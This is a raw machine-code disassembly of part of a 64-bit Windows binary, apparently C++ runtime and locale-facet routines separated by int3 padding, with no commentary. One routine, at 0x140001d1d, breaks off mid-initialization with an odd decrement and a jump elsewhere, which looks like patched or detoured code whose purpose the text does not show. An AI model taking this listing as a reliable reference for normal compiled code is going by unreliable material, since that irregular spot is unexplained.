   140001c94:	e8 ef ee 0b 00       	call   0x1400c0b88
   140001c99:	48 8d 05 c0 d6 11 00 	lea    0x11d6c0(%rip),%rax        # 0x14011f360
   140001ca0:	48 89 03             	mov    %rax,(%rbx)
   140001ca3:	48 8b c3             	mov    %rbx,%rax
   140001ca6:	48 83 c4 20          	add    $0x20,%rsp
   140001caa:	5b                   	pop    %rbx
   140001cab:	c3                   	ret
   140001cac:	cc                   	int3
   140001cad:	cc                   	int3
   140001cae:	cc                   	int3
   140001caf:	cc                   	int3
   140001cb0:	48 8d 05 c9 c6 11 00 	lea    0x11c6c9(%rip),%rax        # 0x14011e380
   140001cb7:	48 89 01             	mov    %rax,(%rcx)
   140001cba:	c3                   	ret
   140001cbb:	cc                   	int3
   140001cbc:	cc                   	int3
   140001cbd:	cc                   	int3
   140001cbe:	cc                   	int3
   140001cbf:	cc                   	int3
   140001cc0:	40 53                	rex push %rbx
   140001cc2:	48 83 ec 20          	sub    $0x20,%rsp
   140001cc6:	48 8d 05 b3 c6 11 00 	lea    0x11c6b3(%rip),%rax        # 0x14011e380
   140001ccd:	48 8b d9             	mov    %rcx,%rbx
   140001cd0:	48 89 01             	mov    %rax,(%rcx)
   140001cd3:	f6 c2 01             	test   $0x1,%dl
   140001cd6:	74 0a                	je     0x140001ce2
   140001cd8:	ba 08 00 00 00       	mov    $0x8,%edx
   140001cdd:	e8 ae c6 0b 00       	call   0x1400be390
   140001ce2:	48 8b c3             	mov    %rbx,%rax
   140001ce5:	48 83 c4 20          	add    $0x20,%rsp
   140001ce9:	5b                   	pop    %rbx
   140001cea:	c3                   	ret
   140001ceb:	cc                   	int3
   140001cec:	cc                   	int3
   140001ced:	cc                   	int3
   140001cee:	cc                   	int3
   140001cef:	cc                   	int3
   140001cf0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001cf5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001cfa:	57                   	push   %rdi
   140001cfb:	48 83 ec 20          	sub    $0x20,%rsp
   140001cff:	48 8b fa             	mov    %rdx,%rdi
   140001d02:	48 8b d9             	mov    %rcx,%rbx
   140001d05:	33 d2                	xor    %edx,%edx
   140001d07:	e8 b4 ba 08 00       	call   0x14008d7c0
   140001d0c:	90                   	nop
   140001d0d:	33 c0                	xor    %eax,%eax
   140001d0f:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001d13:	88 43 10             	mov    %al,0x10(%rbx)
   140001d16:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140001d1a:	88 43 20             	mov    %al,0x20(%rbx)
   140001d1d:	48                   	rex.W
   140001d1e:	48 ff c9             	dec    %rcx
   140001d21:	e9 b1 13 00 00       	jmp    0x1400030d7
   140001d26:	89 43 38             	mov    %eax,0x38(%rbx)
   140001d29:	66 89 43 40          	mov    %ax,0x40(%rbx)
   140001d2d:	48 89 43 48          	mov    %rax,0x48(%rbx)
   140001d31:	88 43 50             	mov    %al,0x50(%rbx)
   140001d34:	48 89 43 58          	mov    %rax,0x58(%rbx)
   140001d38:	88 43 60             	mov    %al,0x60(%rbx)
   140001d3b:	48 85 ff             	test   %rdi,%rdi
   140001d3e:	74 1a                	je     0x140001d5a
   140001d40:	48 8b d7             	mov    %rdi,%rdx
   140001d43:	48 8b cb             	mov    %rbx,%rcx
   140001d46:	e8 55 c7 08 00       	call   0x14008e4a0
   140001d4b:	90                   	nop
   140001d4c:	48 8b c3             	mov    %rbx,%rax
   140001d4f:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001d54:	48 83 c4 20          	add    $0x20,%rsp
   140001d58:	5f                   	pop    %rdi
   140001d59:	c3                   	ret
   140001d5a:	48 8d 0d ef c9 12 00 	lea    0x12c9ef(%rip),%rcx        # 0x14012e750
   140001d61:	e8 1e c2 08 00       	call   0x14008df84
   140001d66:	cc                   	int3
   140001d67:	cc                   	int3
   140001d68:	cc                   	int3
   140001d69:	cc                   	int3
   140001d6a:	cc                   	int3
   140001d6b:	cc                   	int3
   140001d6c:	cc                   	int3
   140001d6d:	cc                   	int3
   140001d6e:	cc                   	int3
   140001d6f:	cc                   	int3
   140001d70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d75:	57                   	push   %rdi
   140001d76:	48 83 ec 20          	sub    $0x20,%rsp
   140001d7a:	48 8b d9             	mov    %rcx,%rbx
   140001d7d:	e8 8a c7 08 00       	call   0x14008e50c
   140001d82:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140001d86:	48 85 c9             	test   %rcx,%rcx
   140001d89:	74 05                	je     0x140001d90
   140001d8b:	e8 78 08 0e 00       	call   0x1400e2608
   140001d90:	33 ff                	xor    %edi,%edi
   140001d92:	48 89 7b 58          	mov    %rdi,0x58(%rbx)
   140001d96:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140001d9a:	48 85 c9             	test   %rcx,%rcx
   140001d9d:	74 05                	je     0x140001da4
   140001d9f:	e8 64 08 0e 00       	call   0x1400e2608
   140001da4:	48 89 7b 48          	mov    %rdi,0x48(%rbx)
   140001da8:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140001dac:	48 85 c9             	test   %rcx,%rcx
   140001daf:	74 05                	je     0x140001db6
   140001db1:	e8 52 08 0e 00       	call   0x1400e2608
   140001db6:	48 89 7b 38          	mov    %rdi,0x38(%rbx)
   140001dba:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140001dbe:	48 85 c9             	test   %rcx,%rcx
   140001dc1:	74 05                	je     0x140001dc8
   140001dc3:	e8 40 08 0e 00       	call   0x1400e2608
   140001dc8:	48 89 7b 28          	mov    %rdi,0x28(%rbx)
   140001dcc:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140001dd0:	48 85 c9             	test   %rcx,%rcx
   140001dd3:	74 05                	je     0x140001dda
   140001dd5:	e8 2e 08 0e 00       	call   0x1400e2608
   140001dda:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   140001dde:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001de2:	48 85 c9             	test   %rcx,%rcx
   140001de5:	74 05                	je     0x140001dec
   140001de7:	e8 1c 08 0e 00       	call   0x1400e2608
   140001dec:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140001df0:	48 8b cb             	mov    %rbx,%rcx
   140001df3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001df8:	48 83 c4 20          	add    $0x20,%rsp
   140001dfc:	5f                   	pop    %rdi
   140001dfd:	e9 52 ba 08 00       	jmp    0x14008d854
   140001e02:	cc                   	int3
   140001e03:	cc                   	int3
   140001e04:	cc                   	int3
   140001e05:	cc                   	int3
   140001e06:	cc                   	int3
   140001e07:	cc                   	int3
   140001e08:	cc                   	int3
   140001e09:	cc                   	int3
   140001e0a:	cc                   	int3
   140001e0b:	cc                   	int3
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	40 53                	rex push %rbx
   140001e12:	48 83 ec 40          	sub    $0x40,%rsp
   140001e16:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001e1b:	48 8b da             	mov    %rdx,%rbx
   140001e1e:	e8 8d cb 08 00       	call   0x14008e9b0
   140001e23:	0f 10 00             	movups (%rax),%xmm0
   140001e26:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140001e2a:	48 8b c3             	mov    %rbx,%rax
   140001e2d:	0f 11 03             	movups %xmm0,(%rbx)
   140001e30:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   140001e34:	48 83 c4 40          	add    $0x40,%rsp
   140001e38:	5b                   	pop    %rbx
   140001e39:	c3                   	ret
   140001e3a:	cc                   	int3
   140001e3b:	cc                   	int3
   140001e3c:	cc                   	int3
   140001e3d:	cc                   	int3
   140001e3e:	cc                   	int3
   140001e3f:	cc                   	int3
   140001e40:	40 53                	rex push %rbx
   140001e42:	48 83 ec 50          	sub    $0x50,%rsp
   140001e46:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001e4b:	48 8b da             	mov    %rdx,%rbx
   140001e4e:	e8 51 cd 08 00       	call   0x14008eba4
   140001e53:	0f 10 00             	movups (%rax),%xmm0
   140001e56:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140001e5a:	0f 11 03             	movups %xmm0,(%rbx)
   140001e5d:	f2 0f 10 40 20       	movsd  0x20(%rax),%xmm0
   140001e62:	8b 40 28             	mov    0x28(%rax),%eax
   140001e65:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   140001e69:	f2 0f 11 43 20       	movsd  %xmm0,0x20(%rbx)
   140001e6e:	89 43 28             	mov    %eax,0x28(%rbx)
   140001e71:	48 8b c3             	mov    %rbx,%rax
   140001e74:	48 83 c4 50          	add    $0x50,%rsp
   140001e78:	5b                   	pop    %rbx
   140001e79:	c3                   	ret
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	cc                   	int3
   140001e7d:	cc                   	int3
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	e9 93 fe 0d 00       	jmp    0x1400e1d18
   140001e85:	cc                   	int3
   140001e86:	cc                   	int3
   140001e87:	cc                   	int3
   140001e88:	cc                   	int3
   140001e89:	cc                   	int3
   140001e8a:	cc                   	int3
   140001e8b:	cc                   	int3
   140001e8c:	cc                   	int3
   140001e8d:	cc                   	int3
   140001e8e:	cc                   	int3
   140001e8f:	cc                   	int3
   140001e90:	48 8d 05 c9 c8 12 00 	lea    0x12c8c9(%rip),%rax        # 0x14012e760
   140001e97:	c3                   	ret
   140001e98:	cc                   	int3
   140001e99:	cc                   	int3
   140001e9a:	cc                   	int3
   140001e9b:	cc                   	int3
   140001e9c:	cc                   	int3
   140001e9d:	cc                   	int3
   140001e9e:	cc                   	int3
   140001e9f:	cc                   	int3
   140001ea0:	48 8d 05 c1 c8 12 00 	lea    0x12c8c1(%rip),%rax        # 0x14012e768
   140001ea7:	c3                   	ret
   140001ea8:	cc                   	int3
   140001ea9:	cc                   	int3
   140001eaa:	cc                   	int3
   140001eab:	cc                   	int3
   140001eac:	cc                   	int3
   140001ead:	cc                   	int3
   140001eae:	cc                   	int3
   140001eaf:	cc                   	int3
   140001eb0:	48 89 11             	mov    %rdx,(%rcx)
   140001eb3:	48 8b c1             	mov    %rcx,%rax
   140001eb6:	c3                   	ret
   140001eb7:	cc                   	int3
   140001eb8:	cc                   	int3
   140001eb9:	cc                   	int3
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	40 53                	rex push %rbx
   140001ec2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ec6:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140001eca:	48 8b d9             	mov    %rcx,%rbx
   140001ecd:	75 38                	jne    0x140001f07
   140001ecf:	33 d2                	xor    %edx,%edx
   140001ed1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001ed6:	e8 e5 b8 08 00       	call   0x14008d7c0
   140001edb:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140001edf:	75 13                	jne    0x140001ef4
   140001ee1:	8b 05 59 30 14 00    	mov    0x143059(%rip),%eax        # 0x140144f40
   140001ee7:	ff c0                	inc    %eax
   140001ee9:	89 05 51 30 14 00    	mov    %eax,0x143051(%rip)        # 0x140144f40
   140001eef:	48 98                	cltq
   140001ef1:	48 89 03             	mov    %rax,(%rbx)
   140001ef4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001ef9:	e8 56 b9 08 00       	call   0x14008d854
   140001efe:	48 8b 03             	mov    (%rbx),%rax
   140001f01:	48 83 c4 20          	add    $0x20,%rsp
   140001f05:	5b                   	pop    %rbx
   140001f06:	c3                   	ret
   140001f07:	48 8b 01             	mov    (%rcx),%rax
   140001f0a:	48 83 c4 20          	add    $0x20,%rsp
   140001f0e:	5b                   	pop    %rbx
   140001f0f:	c3                   	ret
   140001f10:	f0 ff 41 08          	lock incl 0x8(%rcx)
   140001f14:	c3                   	ret
   140001f15:	cc                   	int3
   140001f16:	cc                   	int3
   140001f17:	cc                   	int3
   140001f18:	cc                   	int3
   140001f19:	cc                   	int3
   140001f1a:	cc                   	int3
   140001f1b:	cc                   	int3
   140001f1c:	cc                   	int3
   140001f1d:	cc                   	int3
   140001f1e:	cc                   	int3
   140001f1f:	cc                   	int3
   140001f20:	f0 83 41 08 ff       	lock addl $0xffffffff,0x8(%rcx)
   140001f25:	b8 00 00 00 00       	mov    $0x0,%eax
   140001f2a:	48 0f 44 c1          	cmove  %rcx,%rax
   140001f2e:	c3                   	ret
   140001f2f:	cc                   	int3
   140001f30:	48 8d 05 69 c4 11 00 	lea    0x11c469(%rip),%rax        # 0x14011e3a0
   140001f37:	89 51 08             	mov    %edx,0x8(%rcx)
   140001f3a:	48 89 01             	mov    %rax,(%rcx)
   140001f3d:	48 8b c1             	mov    %rcx,%rax
   140001f40:	c3                   	ret
   140001f41:	cc                   	int3
   140001f42:	cc                   	int3
   140001f43:	cc                   	int3
   140001f44:	cc                   	int3
   140001f45:	cc                   	int3
   140001f46:	cc                   	int3
   140001f47:	cc                   	int3
   140001f48:	cc                   	int3
   140001f49:	cc                   	int3
   140001f4a:	cc                   	int3
   140001f4b:	cc                   	int3
   140001f4c:	cc                   	int3
   140001f4d:	cc                   	int3
   140001f4e:	cc                   	int3
   140001f4f:	cc                   	int3
   140001f50:	40 53                	rex push %rbx
   140001f52:	48 83 ec 20          	sub    $0x20,%rsp
   140001f56:	48 8b d9             	mov    %rcx,%rbx
   140001f59:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   140001f5d:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140001f61:	48 8b 01             	mov    (%rcx),%rax
   140001f64:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001f68:	ff 15 1a b4 11 00    	call   *0x11b41a(%rip)        # 0x14011d388
   140001f6e:	48 8b c3             	mov    %rbx,%rax
   140001f71:	48 83 c4 20          	add    $0x20,%rsp
   140001f75:	5b                   	pop    %rbx
   140001f76:	c3                   	ret
   140001f77:	cc                   	int3
   140001f78:	cc                   	int3
   140001f79:	cc                   	int3
   140001f7a:	cc                   	int3
   140001f7b:	cc                   	int3
   140001f7c:	cc                   	int3
   140001f7d:	cc                   	int3
   140001f7e:	cc                   	int3
   140001f7f:	cc                   	int3
   140001f80:	40 53                	rex push %rbx
   140001f82:	48 83 ec 20          	sub    $0x20,%rsp
   140001f86:	48 8b d9             	mov    %rcx,%rbx
   140001f89:	b1 01                	mov    $0x1,%cl
   140001f8b:	e8 9c c3 08 00       	call   0x14008e32c
   140001f90:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001f94:	48 8b c3             	mov    %rbx,%rax
   140001f97:	48 83 c4 20          	add    $0x20,%rsp
   140001f9b:	5b                   	pop    %rbx
   140001f9c:	c3                   	ret
   140001f9d:	cc                   	int3
   140001f9e:	cc                   	int3
   140001f9f:	cc                   	int3
   140001fa0:	48 83 ec 28          	sub    $0x28,%rsp
   140001fa4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001fa8:	48 85 c9             	test   %rcx,%rcx
   140001fab:	74 2e                	je     0x140001fdb
   140001fad:	48 8b 01             	mov    (%rcx),%rax
   140001fb0:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001fb4:	ff 15 ce b3 11 00    	call   *0x11b3ce(%rip)        # 0x14011d388
   140001fba:	4c 8b c0             	mov    %rax,%r8
   140001fbd:	48 85 c0             	test   %rax,%rax
   140001fc0:	74 19                	je     0x140001fdb
   140001fc2:	48 8b 08             	mov    (%rax),%rcx
   140001fc5:	ba 01 00 00 00       	mov    $0x1,%edx
   140001fca:	48 8b 01             	mov    (%rcx),%rax
   140001fcd:	49 8b c8             	mov    %r8,%rcx
   140001fd0:	48 83 c4 28          	add    $0x28,%rsp
   140001fd4:	48 ff 25 ad b3 11 00 	rex.W jmp *0x11b3ad(%rip)        # 0x14011d388
   140001fdb:	48 83 c4 28          	add    $0x28,%rsp
   140001fdf:	c3                   	ret
   140001fe0:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140001fe4:	48 85 c0             	test   %rax,%rax
   140001fe7:	74 12                	je     0x140001ffb
   140001fe9:	48 8b 48 28          	mov    0x28(%rax),%rcx
   140001fed:	48 85 c9             	test   %rcx,%rcx
   140001ff0:	74 04                	je     0x140001ff6
   140001ff2:	48 8b c1             	mov    %rcx,%rax
   140001ff5:	c3                   	ret
   140001ff6:	48 83 c0 30          	add    $0x30,%rax
   140001ffa:	c3                   	ret
   140001ffb:	48 8d 05 29 c7 12 00 	lea    0x12c729(%rip),%rax        # 0x14012e72b
   140002002:	c3                   	ret
   140002003:	cc                   	int3
   140002004:	cc                   	int3
   140002005:	cc                   	int3
   140002006:	cc                   	int3
   140002007:	cc                   	int3
   140002008:	cc                   	int3
   140002009:	cc                   	int3
   14000200a:	cc                   	int3
   14000200b:	cc                   	int3
   14000200c:	cc                   	int3
   14000200d:	cc                   	int3
   14000200e:	cc                   	int3
   14000200f:	cc                   	int3
   140002010:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002015:	57                   	push   %rdi
   140002016:	48 83 ec 20          	sub    $0x20,%rsp
   14000201a:	48 8b da             	mov    %rdx,%rbx
   14000201d:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140002021:	48 8d 3c dd 00 00 00 	lea    0x0(,%rbx,8),%rdi
   140002028:	00 
   140002029:	48 3b 5a 18          	cmp    0x18(%rdx),%rbx
   14000202d:	73 16                	jae    0x140002045
   14000202f:	0f ae e8             	lfence
   140002032:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140002036:	48 8b 42 10          	mov    0x10(%rdx),%rax
   14000203a:	48 8b 04 07          	mov    (%rdi,%rax,1),%rax
   14000203e:	48 85 c0             	test   %rax,%rax
   140002041:	75 2d                	jne    0x140002070
   140002043:	eb 02                	jmp    0x140002047
   140002045:	33 c0                	xor    %eax,%eax
   140002047:	80 7a 24 00          	cmpb   $0x0,0x24(%rdx)
   14000204b:	74 23                	je     0x140002070
   14000204d:	e8 d2 c2 08 00       	call   0x14008e324
   140002052:	48 3b 58 18          	cmp    0x18(%rax),%rbx
   140002056:	73 16                	jae    0x14000206e
   140002058:	0f ae e8             	lfence
   14000205b:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000205f:	48 8b 04 07          	mov    (%rdi,%rax,1),%rax
   140002063:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002068:	48 83 c4 20          	add    $0x20,%rsp
   14000206c:	5f                   	pop    %rdi
   14000206d:	c3                   	ret
   14000206e:	33 c0                	xor    %eax,%eax
   140002070:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002075:	48 83 c4 20          	add    $0x20,%rsp
   140002079:	5f                   	pop    %rdi
   14000207a:	c3                   	ret
   14000207b:	cc                   	int3
   14000207c:	cc                   	int3
   14000207d:	cc                   	int3
   14000207e:	cc                   	int3
   14000207f:	cc                   	int3
   140002080:	40 53                	rex push %rbx
   140002082:	48 83 ec 20          	sub    $0x20,%rsp
   140002086:	48 8d 05 f3 c2 11 00 	lea    0x11c2f3(%rip),%rax        # 0x14011e380
   14000208d:	48 8b d9             	mov    %rcx,%rbx
   140002090:	48 89 01             	mov    %rax,(%rcx)
   140002093:	f6 c2 01             	test   $0x1,%dl
   140002096:	74 0a                	je     0x1400020a2
   140002098:	ba 10 00 00 00       	mov    $0x10,%edx
   14000209d:	e8 ee c2 0b 00       	call   0x1400be390
   1400020a2:	48 8b c3             	mov    %rbx,%rax
   1400020a5:	48 83 c4 20          	add    $0x20,%rsp
   1400020a9:	5b                   	pop    %rbx
   1400020aa:	c3                   	ret
   1400020ab:	cc                   	int3
   1400020ac:	cc                   	int3
   1400020ad:	cc                   	int3
   1400020ae:	cc                   	int3
   1400020af:	cc                   	int3
   1400020b0:	48 8d 05 c9 c2 11 00 	lea    0x11c2c9(%rip),%rax        # 0x14011e380
   1400020b7:	48 89 01             	mov    %rax,(%rcx)
   1400020ba:	48 8b c1             	mov    %rcx,%rax
   1400020bd:	c3                   	ret
   1400020be:	cc                   	int3
   1400020bf:	cc                   	int3
   1400020c0:	48 8d 05 b1 d2 11 00 	lea    0x11d2b1(%rip),%rax        # 0x14011f378
   1400020c7:	89 51 08             	mov    %edx,0x8(%rcx)
   1400020ca:	48 89 01             	mov    %rax,(%rcx)
   1400020cd:	48 8b c1             	mov    %rcx,%rax
   1400020d0:	c3                   	ret
   1400020d1:	cc                   	int3
   1400020d2:	cc                   	int3
   1400020d3:	cc                   	int3
   1400020d4:	cc                   	int3
   1400020d5:	cc                   	int3
   1400020d6:	cc                   	int3
   1400020d7:	cc                   	int3
   1400020d8:	cc                   	int3
   1400020d9:	cc                   	int3
   1400020da:	cc                   	int3
   1400020db:	cc                   	int3
   1400020dc:	cc                   	int3
   1400020dd:	cc                   	int3
   1400020de:	cc                   	int3
   1400020df:	cc                   	int3
   1400020e0:	48 8b 01             	mov    (%rcx),%rax
   1400020e3:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400020e7:	48 ff 25 9a b2 11 00 	rex.W jmp *0x11b29a(%rip)        # 0x14011d388
   1400020ee:	cc                   	int3
   1400020ef:	cc                   	int3
   1400020f0:	32 c0                	xor    %al,%al
   1400020f2:	c3                   	ret
   1400020f3:	cc                   	int3
   1400020f4:	cc                   	int3
   1400020f5:	cc                   	int3
   1400020f6:	cc                   	int3
   1400020f7:	cc                   	int3
   1400020f8:	cc                   	int3
   1400020f9:	cc                   	int3
   1400020fa:	cc                   	int3
   1400020fb:	cc                   	int3
   1400020fc:	cc                   	int3
   1400020fd:	cc                   	int3
   1400020fe:	cc                   	int3
   1400020ff:	cc                   	int3
   140002100:	b8 01 00 00 00       	mov    $0x1,%eax
   140002105:	c3                   	ret
   140002106:	cc                   	int3
   140002107:	cc                   	int3
   140002108:	cc                   	int3
   140002109:	cc                   	int3
   14000210a:	cc                   	int3
   14000210b:	cc                   	int3
   14000210c:	cc                   	int3
   14000210d:	cc                   	int3
   14000210e:	cc                   	int3
   14000210f:	cc                   	int3
   140002110:	48 8d 05 99 d2 11 00 	lea    0x11d299(%rip),%rax        # 0x14011f3b0
   140002117:	89 51 08             	mov    %edx,0x8(%rcx)
   14000211a:	48 89 01             	mov    %rax,(%rcx)
   14000211d:	48 8b c1             	mov    %rcx,%rax
   140002120:	c3                   	ret
   140002121:	cc                   	int3
   140002122:	cc                   	int3
   140002123:	cc                   	int3
   140002124:	cc                   	int3
   140002125:	cc                   	int3
   140002126:	cc                   	int3
   140002127:	cc                   	int3
   140002128:	cc                   	int3
   140002129:	cc                   	int3
   14000212a:	cc                   	int3
   14000212b:	cc                   	int3
   14000212c:	cc                   	int3
   14000212d:	cc                   	int3
   14000212e:	cc                   	int3
   14000212f:	cc                   	int3
   140002130:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140002134:	45 0f b6 c0          	movzbl %r8b,%r8d
   140002138:	66 42 85 14 40       	test   %dx,(%rax,%r8,2)
   14000213d:	0f 95 c0             	setne  %al
   140002140:	c3                   	ret
   140002141:	cc                   	int3
   140002142:	cc                   	int3
   140002143:	cc                   	int3
   140002144:	cc                   	int3
   140002145:	cc                   	int3
   140002146:	cc                   	int3
   140002147:	cc                   	int3
   140002148:	cc                   	int3
   140002149:	cc                   	int3
   14000214a:	cc                   	int3
   14000214b:	cc                   	int3
   14000214c:	cc                   	int3
   14000214d:	cc                   	int3
   14000214e:	cc                   	int3
   14000214f:	cc                   	int3
   140002150:	48 8b 01             	mov    (%rcx),%rax
   140002153:	48 8b 40 40          	mov    0x40(%rax),%rax
   140002157:	48 ff 25 2a b2 11 00 	rex.W jmp *0x11b22a(%rip)        # 0x14011d388
   14000215e:	cc                   	int3
   14000215f:	cc                   	int3
   140002160:	48 83 ec 38          	sub    $0x38,%rsp
   140002164:	48 8b 01             	mov    (%rcx),%rax
   140002167:	48 8b 40 38          	mov    0x38(%rax),%rax
   14000216b:	ff 15 17 b2 11 00    	call   *0x11b217(%rip)        # 0x14011d388
   140002171:	48 83 c4 38          	add    $0x38,%rsp
   140002175:	c3                   	ret
   140002176:	cc                   	int3
   140002177:	cc                   	int3
   140002178:	cc                   	int3
   140002179:	cc                   	int3
   14000217a:	cc                   	int3
   14000217b:	cc                   	int3
   14000217c:	cc                   	int3
   14000217d:	cc                   	int3
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	40 53                	rex push %rbx
   140002182:	48 83 ec 40          	sub    $0x40,%rsp
   140002186:	48 8d 05 43 d2 11 00 	lea    0x11d243(%rip),%rax        # 0x14011f3d0
   14000218d:	44 89 41 08          	mov    %r8d,0x8(%rcx)
   140002191:	48 89 01             	mov    %rax,(%rcx)
   140002194:	48 8b d9             	mov    %rcx,%rbx
   140002197:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000219c:	e8 0f c8 08 00       	call   0x14008e9b0
   1400021a1:	0f 10 00             	movups (%rax),%xmm0
   1400021a4:	0f 11 43 10          	movups %xmm0,0x10(%rbx)
   1400021a8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400021ac:	48 8b c3             	mov    %rbx,%rax
   1400021af:	0f 11 4b 20          	movups %xmm1,0x20(%rbx)
   1400021b3:	48 83 c4 40          	add    $0x40,%rsp
   1400021b7:	5b                   	pop    %rbx
   1400021b8:	c3                   	ret
   1400021b9:	cc                   	int3
   1400021ba:	cc                   	int3
   1400021bb:	cc                   	int3
   1400021bc:	cc                   	int3
   1400021bd:	cc                   	int3
   1400021be:	cc                   	int3
   1400021bf:	cc                   	int3
   1400021c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400021c5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400021ca:	55                   	push   %rbp
   1400021cb:	57                   	push   %rdi
   1400021cc:	41 56                	push   %r14
   1400021ce:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   1400021d3:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   1400021da:	48 8b da             	mov    %rdx,%rbx
   1400021dd:	48 8b f9             	mov    %rcx,%rdi
   1400021e0:	45 33 f6             	xor    %r14d,%r14d
   1400021e3:	48 85 c9             	test   %rcx,%rcx
   1400021e6:	0f 84 34 01 00 00    	je     0x140002320
   1400021ec:	4c 39 31             	cmp    %r14,(%rcx)
   1400021ef:	0f 85 2b 01 00 00    	jne    0x140002320
   1400021f5:	41 8d 4e 30          	lea    0x30(%r14),%ecx
   1400021f9:	e8 9a c1 0b 00       	call   0x1400be398
   1400021fe:	48 8b f0             	mov    %rax,%rsi
   140002201:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140002205:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002209:	48 85 c9             	test   %rcx,%rcx
   14000220c:	74 0f                	je     0x14000221d
   14000220e:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   140002212:	48 85 db             	test   %rbx,%rbx
   140002215:	75 0d                	jne    0x140002224
   140002217:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   14000221b:	eb 07                	jmp    0x140002224
   14000221d:	48 8d 1d 07 c5 12 00 	lea    0x12c507(%rip),%rbx        # 0x14012e72b
   140002224:	33 d2                	xor    %edx,%edx
   140002226:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   14000222a:	e8 91 b5 08 00       	call   0x14008d7c0
   14000222f:	90                   	nop
   140002230:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140002234:	c6 45 c7 00          	movb   $0x0,-0x39(%rbp)
   140002238:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   14000223c:	c6 45 d7 00          	movb   $0x0,-0x29(%rbp)
   140002240:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   140002244:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   140002249:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   14000224d:	66 44 89 75 f7       	mov    %r14w,-0x9(%rbp)
   140002252:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   140002256:	c6 45 07 00          	movb   $0x0,0x7(%rbp)
   14000225a:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   14000225e:	c6 45 17 00          	movb   $0x0,0x17(%rbp)
   140002262:	48 85 db             	test   %rbx,%rbx
   140002265:	0f 84 d2 00 00 00    	je     0x14000233d
   14000226b:	48 8b d3             	mov    %rbx,%rdx
   14000226e:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140002272:	e8 29 c2 08 00       	call   0x14008e4a0
   140002277:	90                   	nop
   140002278:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   14000227c:	48 8d 05 4d d1 11 00 	lea    0x11d14d(%rip),%rax        # 0x14011f3d0
   140002283:	48 89 06             	mov    %rax,(%rsi)
   140002286:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   14000228a:	e8 21 c7 08 00       	call   0x14008e9b0
   14000228f:	0f 10 00             	movups (%rax),%xmm0
   140002292:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   140002296:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000229a:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   14000229e:	48 89 37             	mov    %rsi,(%rdi)
   1400022a1:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   1400022a5:	e8 62 c2 08 00       	call   0x14008e50c
   1400022aa:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
